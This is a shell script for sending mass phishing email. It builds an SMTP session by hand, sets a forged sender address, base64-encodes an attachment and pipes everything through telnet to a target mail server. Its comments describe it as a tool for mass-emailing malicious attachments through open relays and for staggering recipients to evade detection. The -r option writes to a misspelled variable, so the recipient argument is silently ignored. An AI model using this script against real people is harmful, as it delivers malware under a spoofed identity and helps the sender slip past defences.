#!/bin/sh

#Note this script requires editing to control usage, if a pure command line option option-parsed alternative is
#preferred for open relay email messaging use sendEmail or SEToolkit. Specifically no options are set for the
#FROMAIL variable, which can be edited directly below the usage function as well as the mailserver, 
#mailserverPort, SUBJECT and MSGBODY variables may wish to be edited (in the top lines of following the comments.

#The purpose of this bash script is that it is easily editable and can be used as an alternative to SEToolkit
#for mass emailing malicious attachments as an attack vectors. One can for example delay iteration over the -r 
#(reciever) option in order to evade certain detection measures using this script. All other options that one 
#may wish to edit as defaults during an engagement are commented for ease of use.

#To fully automate this program without option parsing, execpt -r ($recipient)


#Define defaults
#receptiant
TOMAIL="target@target.dom";
#subject
SUBJECT="You got mail - $DATE";
#message
MSGBODY="default message body";
#attachment
ATTACHMENT="/usr/share/set/readme/User_Manual.pdf"
# Default smtp server
mailserver="mail.target.dom"
mailserverPort="25"

showUsage() {
        echo "$0 -a /file/to/attach [-m /message/file] [-M \"Message string\"] -s \"subject\" -r receiver@target.dom"
        echo
        echo "The attachment (-a) is required, if no attachment is used then rather use sendmail directly."
}

fappend() {
    echo "$2">>$1;
}
DATE=`date`

#domain=`grep search /etc/resolv.conf | awk '{print $2;}'` #for local address, if used comment out domain= line
domain='dom'
computer='kali'
user='hacker'
FROMAIL="$user@$computer.$domain"

while getopts "M:m:a:s:r:" opt; do
  case $opt in
        s)
          SUBJECT="$OPTARG - $DATE"
          ;;
        r)
          TOEMAIL="$OPTARG"
          ;;
        m)
          MSGBODY=`cat $OPTARG`
          ;;
        M)
          MSGBODY="$OPTARG"
          ;;
        a)
          ATTACHMENT="$OPTARG"
          ;;
        :)
          showUsage
          ;;
        \?)
          showUsage
          ;;
  esac
done

if [ "$ATTACHMENT" = "" ]; then
        showUsage
        exit 1
fi

MIMETYPE=`file --mime-type -b $ATTACHMENT`
TMP="/tmp/email"`date +%N`;
BOUNDARY=`date +%s|md5sum|awk '{print $1;}'`
FILENAME=`basename $ATTACHMENT`

DATA=`cat $ATTACHMENT|base64`

rm $TMP 2> /dev/null

fappend $TMP "EHLO $mailserver"
fappend $TMP "MAIL FROM:<$FROMAIL>"
fappend $TMP "RCPT TO:<$TOMAIL>"
fappend $TMP "DATA"
fappend $TMP "From: $FROMAIL"
fappend $TMP "To: $TOMAIL"
fappend $TMP "Reply-To: $FROMAIL"
fappend $TMP "Subject: $SUBJECT"
fappend $TMP "Content-Type: multipart/mixed; boundary=\"$BOUNDARY\""
fappend $TMP ""
fappend $TMP "This is a MIME-formatted message. If you see this text it means that your"
fappend $TMP "email software does not support MIME formatted messages."
fappend $TMP ""
fappend $TMP "--$BOUNDARY"
fappend $TMP "Content-Type: text/plain; charset=UTF-8; format=flowed"
fappend $TMP "Content-Disposition: inline"
fappend $TMP ""
fappend $TMP "$MSGBODY"
fappend $TMP ""
fappend $TMP ""
fappend $TMP "--$BOUNDARY"
fappend $TMP "Content-Type: $MIMETYPE; name=\"$FILENAME\""
fappend $TMP "Content-Transfer-Encoding: base64"
fappend $TMP "Content-Disposition: attachment; filename=\"$FILENAME\";"
fappend $TMP ""
fappend $TMP "$DATA"
fappend $TMP ""
fappend $TMP ""
fappend $TMP "--$BOUNDARY--"
fappend $TMP ""
fappend $TMP "."
fappend $TMP "QUIT"

telnet $mailserver $mailserverPort < $TMP >> $TMP
rc="$?"
if [ "$rc" -ne "0" ]; then
    echo "Return: $rc"
    echo "To debug inspect $TMP"
else
    rm $TMP;
fi

